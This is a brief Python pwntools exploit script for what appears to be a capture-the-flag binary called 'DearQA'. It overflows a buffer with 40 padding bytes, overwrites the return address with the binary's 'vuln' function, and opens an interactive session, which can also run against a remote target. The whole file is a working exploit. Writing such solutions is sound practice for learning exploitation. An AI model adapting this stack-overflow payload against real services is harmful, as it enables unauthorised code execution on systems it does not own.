from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = "DearQA-1627223337406.DearQA"
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'

io = start()

padding = 40

payload = flat(
    padding * b'A',
    elf.symbols['vuln']
)

io.sendlineafter(b"name:",payload)

io.interactive()